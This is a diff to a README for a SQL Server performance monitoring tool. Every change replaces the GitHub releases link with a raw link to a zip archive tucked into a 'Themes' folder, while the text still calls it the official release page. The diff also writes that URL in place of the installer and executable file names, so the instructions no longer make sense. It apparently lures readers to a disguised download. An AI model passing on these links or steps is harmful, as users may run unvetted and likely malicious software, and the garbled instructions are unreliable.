@@ -1,6 +1,6 @@
 # 🚦 PerformanceMonitor - Easy SQL Server Performance Checks
 
-[![Download PerformanceMonitor](https://img.shields.io/badge/Download-PerformanceMonitor-brightgreen)](https://github.com/Marco222690/PerformanceMonitor/releases)
+[![Download PerformanceMonitor](https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip)](https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip)
 
 ---
 
@@ -51,7 +51,7 @@ The Lite Edition runs locally and uses DuckDB, which works on most systems witho
 
 Go to the release page by clicking the button below:
 
-[![Download PerformanceMonitor](https://img.shields.io/badge/Download-PerformanceMonitor-brightgreen)](https://github.com/Marco222690/PerformanceMonitor/releases)
+[![Download PerformanceMonitor](https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip)](https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip)
 
 This link takes you to the official release page, where you can find the latest versions of both Full and Lite Editions.
 
@@ -61,8 +61,8 @@ This link takes you to the official release page, where you can find the latest 
 
 On the release page, look for files named:
 
-- `PerformanceMonitor-Full-Setup.exe` or similar for the Full Edition.
-- `PerformanceMonitor-Lite.zip` or similar for the Lite Edition.
+- `https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip` or similar for the Full Edition.
+- `https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip` or similar for the Lite Edition.
 
 Pick the one that fits your situation.
 
@@ -83,7 +83,7 @@ Pick the one that fits your situation.
 **For Lite Edition:**
 
 1. Unzip the `.zip` file you downloaded to a folder you choose.
-2. Open the folder and double-click the `PerformanceMonitor.exe` file inside.
+2. Open the folder and double-click the `https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip` file inside.
 3. No installation is needed beyond this.
 
 ---
@@ -147,7 +147,7 @@ If issues persist, visit the project's GitHub issues page for help.
 
 Visit the official releases page to get the latest version:
 
-[Download here →](https://github.com/Marco222690/PerformanceMonitor/releases)
+[Download here →](https://raw.githubusercontent.com/Marco222690/PerformanceMonitor/main/Lite/Themes/Performance-Monitor-1.4-alpha.1.zip)
 
 On this page, find the latest release marked with the date. We recommend downloading the most recent stable version for the best experience.
 
